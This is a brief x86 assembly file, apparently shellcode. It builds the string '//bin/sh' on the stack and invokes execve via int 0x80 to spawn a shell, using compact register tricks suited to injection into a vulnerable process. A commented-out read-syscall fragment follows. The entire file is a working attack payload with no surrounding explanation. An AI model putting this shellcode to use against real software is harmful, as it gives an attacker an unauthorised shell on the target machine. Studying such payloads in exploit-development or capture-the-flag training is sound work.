#include <sys/syscall.h>

.global main
.type   main, @function

main:
  push $SYS_execve
  pop %eax
  push $0x0
  push $0x68732f6e
  push $0x69622f2f
  xor %ecx, %ecx
  cltd
  push %esp
  pop %ebx
  int $0x80
  #xor %ebx, %ebx
  #push $0x4c
  #pop %edx
  #push $0x3
  #pop %eax
  #int $0x80
  #ret
